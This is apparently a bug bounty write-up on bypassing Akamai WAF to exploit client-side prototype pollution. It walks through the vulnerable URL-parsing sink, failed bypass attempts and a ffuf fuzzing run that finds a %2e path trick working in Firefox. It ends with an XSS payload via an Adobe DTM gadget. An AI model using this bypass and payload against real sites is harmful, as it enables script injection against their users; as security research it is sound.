<p>A couple of weeks back Max posted a tweet regarding prototype pollution (pp) where he had trouble with Akamai WAF and couldn’t exploit pp coz of the waf.
He was happy to collaborate , split the bounty so I spent much time in bypassing this and at first it looked almost impossible I somehow managed to bypass it in the end.</p>

<p>As nothing of this worked I was curios myself what was the issue and I haven’t found any prototype pollution bugs in real websites so it would be fun I thought.</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/d56d44cc-46b4-40e6-b930-a75efae2c2e2" alt="chrome_F3WCZkQHV9" /></p>

<p>Max shared the site so I first started with checking which vulnerable library was responsible for this in order to identify the sink</p>

<p>Soon enough identified the sink:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nf">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nf">getSearchOrHashBased</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">);</span> <span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">e</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">jQuery</span><span class="p">.</span><span class="nf">isEmptyObject</span><span class="p">(</span><span class="nx">e</span><span class="p">))</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nf">getJsonFromUrl</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">getJsonFromUrl</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="p">{};</span>
    <span class="k">return</span> <span class="nx">e</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;</span><span class="dl">"</span><span class="p">).</span><span class="nf">forEach</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">+</span><span class="dl">"</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="dl">"</span><span class="s2"> </span><span class="dl">"</span><span class="p">)).</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">=</span><span class="dl">"</span><span class="p">)</span>
              <span class="p">,</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">t</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="p">?</span> <span class="nx">e</span><span class="p">.</span><span class="nf">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">t</span><span class="p">)</span> <span class="p">:</span> <span class="nx">e</span>
              <span class="p">,</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">t</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="p">?</span> <span class="nf">decodeURIComponent</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nf">substr</span><span class="p">(</span><span class="nx">t</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span> <span class="p">:</span> <span class="dl">""</span>
              <span class="p">,</span> <span class="nx">o</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="nx">o</span><span class="p">)</span>
                <span class="nx">n</span><span class="p">[</span><span class="nf">decodeURIComponent</span><span class="p">(</span><span class="nx">a</span><span class="p">)]</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
            <span class="k">else</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">]</span><span class="dl">"</span><span class="p">,</span> <span class="nx">o</span><span class="p">)</span>
                  <span class="p">,</span> <span class="nx">r</span> <span class="o">=</span> <span class="nf">decodeURIComponent</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">o</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">s</span><span class="p">));</span>
                <span class="nx">a</span> <span class="o">=</span> <span class="nf">decodeURIComponent</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">o</span><span class="p">)),</span>
                <span class="nx">n</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">||</span> <span class="p">(</span><span class="nx">n</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]),</span>
                <span class="nx">r</span> <span class="p">?</span> <span class="nx">n</span><span class="p">[</span><span class="nx">a</span><span class="p">][</span><span class="nx">r</span><span class="p">]</span> <span class="o">=</span> <span class="nx">i</span> <span class="p">:</span> <span class="nx">n</span><span class="p">[</span><span class="nx">a</span><span class="p">].</span><span class="nf">push</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="c1">// prototype pollution here [2]</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}),</span>
    <span class="nx">n</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The method name says it all <code class="language-plaintext highlighter-rouge">getJsonFromUrl</code> , it converts query parameters to a json object</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">/?sudi=shirley</span><span class="w"> </span><span class="err">will</span><span class="w"> </span><span class="err">be</span><span class="w"> </span><span class="err">converted</span><span class="w"> </span><span class="err">to</span><span class="w"> 

</span><span class="p">{</span><span class="nl">"sudi"</span><span class="p">:</span><span class="s2">"shirley"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>As the above method doesn’t performs any check againsts the key before performing the operation on line [2], this code is vulnerable to prototype pollution.</p>

<p>From this snyk advisory: https://security.snyk.io/vuln/SNYK-JS-LITESPEEDJS-2359250 you can find more details</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PoC
add the following query string ?__proto__[polluted]=yes

open the browser developer console. The property polluted has value yes
</code></pre></div></div>

<p>But it wasn’t as simple as what was mentioned in the POC as Akamai WAF was doing a good job here.</p>

<hr />

<p>The source is <code class="language-plaintext highlighter-rouge">location.href</code> , on line [1] you can see that it calls <code class="language-plaintext highlighter-rouge">getSearchOrHashBased</code> method which extracts the query parameter from the url including hash fragment part.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">getSearchOrHashBased</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">e</span> <span class="o">||</span> <span class="p">(</span><span class="nx">e</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">?</span><span class="dl">"</span><span class="p">)</span>
      <span class="p">,</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">#</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="nx">t</span> <span class="o">&amp;&amp;</span> <span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="nx">n</span> <span class="p">?</span> <span class="p">{}</span> <span class="p">:</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="nx">t</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">t</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">length</span><span class="p">),</span>
    <span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="nx">n</span> <span class="o">||</span> <span class="nx">t</span> <span class="o">==</span> <span class="nx">n</span> <span class="o">+</span> <span class="mi">1</span> <span class="p">?</span> <span class="nx">e</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">:</span> <span class="nx">e</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">t</span><span class="p">))</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This method is used to extract params either from the search or hash parameters from a URL.If there is # in the url and no ? , the hash parameters will be passed on and search params will be ignored.</p>

<p>Bypassing Akamai looked very easy at first ,as seeing source if from fragment part which will not be sent to the server and hence the WAF wouldn’t trigger.</p>

<p>But just coz of one silly mistake it didn’t worked. Can you figure it out what might be the problem? Use your Sharingan and take a good look at the code again (just kiding :p)</p>

<p>The developer forgot to remove the <code class="language-plaintext highlighter-rouge">#</code> part from the parameters</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nf">getSearchOrHashBased</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://example.com/?sudi=shirley</span><span class="dl">"</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">sudi=shirley</span><span class="dl">'</span>
<span class="o">&gt;</span><span class="nf">getSearchOrHashBased</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://example.com/#sudi=shirley</span><span class="dl">"</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">#sudi=shirley</span><span class="dl">'</span>
</code></pre></div></div>

<p>Just because of a silly  mistake , this was passed as a key instead of just the parameter name <code class="language-plaintext highlighter-rouge">#sudi</code>.So upon using <code class="language-plaintext highlighter-rouge">#__proto__[x]=x</code> wouldn’t worke as</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">n</span><span class="p">[</span><span class="dl">"</span><span class="s2">#__proto__</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">x</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">x</span><span class="dl">"</span> <span class="c1">// #__proto__ is undefined</span>

</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nx">n</span> <span class="o">=</span> <span class="p">{}</span>
<span class="p">{}</span>

<span class="o">&gt;</span><span class="nx">n</span><span class="p">[</span><span class="dl">"</span><span class="s2">#__proto__</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">x</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">x</span><span class="dl">"</span>
<span class="nx">VM54</span><span class="p">:</span><span class="mi">1</span> <span class="nx">Uncaught</span> <span class="nx">TypeError</span><span class="p">:</span> <span class="nx">Cannot</span> <span class="kd">set</span> <span class="nx">properties</span> <span class="k">of</span> <span class="nf">undefined </span><span class="p">(</span><span class="nx">setting</span> <span class="dl">'</span><span class="s1">x</span><span class="dl">'</span><span class="p">)</span>
    <span class="nx">at</span> <span class="o">&lt;</span><span class="nx">anonymous</span><span class="o">&gt;</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">22</span>
<span class="p">(</span><span class="nx">anonymous</span><span class="p">)</span> <span class="p">@</span> <span class="nx">VM54</span><span class="p">:</span><span class="mi">1</span>

<span class="o">&gt;</span><span class="nx">n</span><span class="p">[</span><span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">x</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">x</span><span class="dl">"</span>
<span class="dl">'</span><span class="s1">x</span><span class="dl">'</span>

<span class="o">&gt;</span><span class="nx">n</span><span class="p">.</span><span class="nx">__proto__</span>
<span class="p">{</span><span class="nl">x</span><span class="p">:</span> <span class="dl">'</span><span class="s1">x</span><span class="dl">'</span><span class="p">,</span> <span class="kd">constructor</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">__defineGetter__</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">__defineSetter__</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">hasOwnProperty</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span><span class="err"> …</span><span class="p">}</span>
</code></pre></div></div>

<p>As <code class="language-plaintext highlighter-rouge">#</code> part failed we need to rely on the query params itself.</p>

<p>We can try using <code class="language-plaintext highlighter-rouge">contructor.prototype</code> property instead of <code class="language-plaintext highlighter-rouge">__proto__</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">x</span> <span class="o">=</span> <span class="p">{}</span>
<span class="p">{}</span>
<span class="nx">x</span><span class="p">.</span><span class="nx">__proto__</span>
<span class="p">{</span><span class="nl">constructor</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">__defineGetter__</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">__defineSetter__</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">hasOwnProperty</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">__lookupGetter__</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span><span class="err"> …</span><span class="p">}</span>
<span class="nx">x</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span>
<span class="p">{</span><span class="nl">constructor</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">__defineGetter__</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">__defineSetter__</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">hasOwnProperty</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">__lookupGetter__</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span><span class="err"> …</span><span class="p">}</span>
<span class="nx">x</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span> <span class="o">===</span> <span class="nx">x</span><span class="p">.</span><span class="nx">__proto__</span>
<span class="kc">true</span>
</code></pre></div></div>

<p>But this is not useful in our case as the code doesn’t iterates over all the properties recursively and also Akamai blocks the constructor keyword when used inside of <code class="language-plaintext highlighter-rouge">[constructor]</code></p>

<p>The legend Gareth himself also pointed out some solutions so I tried them too:</p>

<p>https://twitter.com/garethheyes/status/1657837036030554115</p>

<ol>
  <li>constructor.prototype</li>
</ol>

<p>As the dot notation isn’t supported in our case I used this instead <code class="language-plaintext highlighter-rouge">constructor[prototype][polluted]</code>
But as already pointed out <code class="language-plaintext highlighter-rouge">[prototype]</code> was blocked by Akamai</p>

<ol>
  <li><em>Try url encoding square brackets or using the hash instead of the query string. Other than that you’d probably need to use the existing code to bypass the WAF</em></li>
</ol>

<p>Url encoded (double url encode also) square brackets were still blocked by Akamai</p>

<p>In addition I also tried url encoding <code class="language-plaintext highlighter-rouge">__proto__</code> and the property which is place inside square brackets as in the <code class="language-plaintext highlighter-rouge">getJsonFromUrl</code> method you can see <code class="language-plaintext highlighter-rouge">decodeURIComponent</code> is used.</p>

<p>And already mentioned hash instead of query string isn’t an option coz of a silly mistake from developer’s side.</p>

<ol>
  <li><em>Oh I forgot obvious stuff like whitespace between brackets etc. JS supports all sorts of whitespace</em></li>
</ol>

<p>To explain this here’s an example,  javaScript is a whitespace-insensitive programming language, which means that it largely ignores whitespace characters like spaces, tabs, and line breaks:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Object</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="mi">1337</span>
<span class="mi">1337</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">x</span>
<span class="mi">1337</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span> <span class="nx">x</span>
<span class="mi">1337</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">__proto__</span> <span class="p">.</span> <span class="nx">x</span>
<span class="mi">1337</span>
<span class="nb">Object</span><span class="p">.</span> <span class="nx">__proto__</span> <span class="p">.</span> <span class="nx">x</span>
<span class="mi">1337</span>
<span class="nb">Object</span><span class="p">.</span>                   <span class="nx">__proto__</span> <span class="p">.</span> <span class="nx">x</span>
</code></pre></div></div>

<p>But still this was also blocked by Akamai</p>

<p>Some more solutions which I suggested myself: https://twitter.com/sudhanshur705/status/1657753816241147904</p>

<hr />

<p><strong>Analyzing the WAF</strong></p>

<p>https://www.target.com/?<strong>proto</strong>            -&gt; allowed
https://www.target.com/?<strong>proto</strong>[]=x        -&gt; allowed
https://www.target.com/?<strong>proto</strong>[x]=x       -&gt; blocked
https://www.target.com/?<strong>proto</strong>[1]=x       -&gt; blocked</p>

<p>I spent almost a whole day and it seemed impossible to bypass, as there are only very limited variations I could do in case prototype pollution. In case of xss you have a no of tags,etc to try but here the options are limited.</p>

<p>So I started fuzzing query params adding some url encoded stuff which might break the WAF</p>

<p>Jub0bs recently posted a writeuop about a beautiful chain of bugs
https://jub0bs.com/posts/2023-05-05-smorgasbord-of-a-bug-chain/</p>

<p>Where he was able to bypass Akamai, by removing the <code class="language-plaintext highlighter-rouge">?</code> from the url and using <code class="language-plaintext highlighter-rouge">&amp;</code> instead.</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/a34b0177-e763-4368-9b7c-85c3f6045959" alt="image" /></p>

<p>I tried the same thing but it didn’t worked, so I though there might be more similar ways to bypass Akamai waf. SO I fuzzed different portions of the url</p>

<p>Like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.target.com/?__proto__[FUZZx]=x
https://www.target.com/?__proto__[x]FUZZ=x
https://www.target.com/?__proto__[FUZZx]=x
https://www.target.com/?FUZZ__proto__[x]=x
https://www.target.com/FUZZ?__proto__[x]=x
</code></pre></div></div>

<p>I used this wordlist: https://gist.github.com/Sudistark/d3e5f9e5dcad77c7e6560cb4b5ad66c8 , which contaions a list of url encoded characters.</p>

<p>The results were suprising one of them actually worked and returned 200 ok. Can you guess which url it was from the above 5 ?</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> urlencoded.txt <span class="nt">-u</span> <span class="s2">"https://www.target.com/FUZZ?__proto__[x]=x"</span>


%2e                     <span class="o">[</span>Status: 200, Size: 26150, Words: 4216, Lines: 558, Duration: 2532ms]
</code></pre></div></div>

<p>Ahhh that’s <code class="language-plaintext highlighter-rouge">.</code></p>

<p>But when I tried opening this url in my chrome browser: https://www.target.com/%2e?<strong>proto</strong>[x]=x
The dot was automatically removed (consumed), which is normal behaviour I guess as browsers as you might have seen browsers normalizes ../ also.</p>

<p>Then I remebered that Firefox is the exception here as it doesn’t consumes the  url encoded <code class="language-plaintext highlighter-rouge">.</code> and it still stays there.
So I again opened the same url now in firefox and this time it worked and also bypassed Akamai WAF.I checked the console to confirm if prototype pollution is working or not</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nx">x</span> <span class="o">=</span> <span class="p">{}</span>
<span class="nb">Object</span> <span class="p">{</span>  <span class="p">}</span>

<span class="o">&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">__proto__</span>
<span class="nb">Object</span> <span class="p">{</span> <span class="nl">x</span><span class="p">:</span> <span class="dl">"</span><span class="s2">x</span><span class="dl">"</span><span class="p">,</span> <span class="err">…</span> <span class="p">}</span>

<span class="o">&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">x</span>
<span class="dl">"</span><span class="s2">x</span><span class="dl">"</span> 
</code></pre></div></div>

<p>And yeah here we finally managed to bypass Akamai :)</p>

<p>Now comes finding the prototype pollution gagdet part, DomInvader has an inbuilt gagdet scanner.As I already saw some 3rd prty libraries like Adobe Dynamic Tag Management were in use in that page. I just picked up the gadget from here: https://github.com/BlackFan/client-side-prototype-pollution</p>

<p>https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/adobe-dtm.md</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?__proto__[src]=data:,alert(1)//
</code></pre></div></div>

<p>Here’s the screenshot of the alert popup</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/9d1ff684-95ce-4017-897a-2a68576945e5" alt="firefox_cgm1PDt65D" /></p>
